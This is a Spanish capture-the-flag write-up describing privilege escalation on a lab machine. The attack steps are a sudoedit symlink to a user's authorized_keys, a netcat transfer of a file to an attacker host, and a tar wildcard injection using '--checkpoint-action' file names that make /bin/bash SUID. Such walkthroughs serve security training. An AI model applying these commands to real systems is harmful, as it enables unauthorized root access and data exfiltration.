## Escalada de privilegios {-}

### Escalada de privilegios al usuario alekos {-}

```bash
ls -l /var/www
```

No tenemos capacidad de escritura en el directorio `/var/www` pero hay un directorio testing donde el usuario proprietario es werkzeug.

```bash
cd /var/www/testing
ls -l
mkdir hannamod
cd !$
echo "Hola" > layout.html
```

Testeamos el comando **sudoedit**

```bash
sudoedit -u alekos /var/www/testing/hannamod/layout.html
```

El comando no abre un nano en el cual podemos editar el contenido. El truco aqui es burlar el fichero para que el usuario pueda editar
un ficher tercio en el cual tenga capacidad de escritura

1. Creamos un enlace symbolico contra el **authorized_keys** del usuario alekos

    ```bash
    ln -s -f /home/alekos/.ssh/authorized_keys layout.html
    ```

1. Nos creamos un par de claves

    ```bash
    ssh-keygen
    ```

1. Lanzamos el **sudoedit** y copiamos la clave publica creada
1. Nos conectamos al usuario alekos por ssh

    ```bash
    ssh -i id-rsa alekos@10.10.10.21
    ```

Pa dentro... somos alekos y podemos leer la flag.

### Escalada de privilegios al usuario root {-}

```bash
id
sudo -l
ls -l
```

vemos que hay dos directorios 

- backup
- development

```bash
cd backup
stat *
stat * | grep "Modify"
```

En el directorio backup vemos que cada 5 minutos una tarea que se esta ejecutando a intervalos regulares de tiempo nos crea un archivo de backup.
Ahora tenemos que saber lo que se esta poniendo en estos backups.

1. En la maquina de atacante

    ```bash
    nc -u -nlvp 443 > dev-1627332901.tar.gz
    ```

1. En la maquina victima

    ```bash
    nc -u 10.10.14.20 443 < dev-1627332901.tar.gz
    ```

mirando el contenido de fichero comprimido, nos damos cuenta que el contenido es el mismo que el directorio development.

Saviendo esto estamos intuiendo que la tarea cron ejecuta un comando del estilo: `tar -cvf backup/test.tar.gz /home/alekos/development/*`.
Aqui el problema es que si el comando es este, el simbolo `*` permitteria burlar el comando tar con breakpoints. Lo que queremos ejecutar seria
el comando siguiente:

```bash
tar -cvf backup/test.tar.gz /home/alekos/development/* --checkpoint=1 --checkpoint-action=exec/bin/sh
```

El echo es que si el comando de la tarea cron tiene el asterisco y que ficheros tienen nombres como `--checkpoint=1` y `--checkpoint-action=exec/bin/sh`,
en vez de copiarlos, los utilizaria como argumentos del proprio comando tar.

```bash
touch privesc
chmod +x privesc

nano privesc

############privesc content##############3

#!/bin/bash

chmod 4755 /bin/bash
```

```bash
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh privesc'
```

Ya esta esperamos hasta el proximo run de la tarea cron.

```bash
watch -n 1 ls -l /bin/bash -d
```

Cuando vemos que la /bin/bash tiene el `s` de SUID podemos convertirnos en root

```bash
bash -p
```

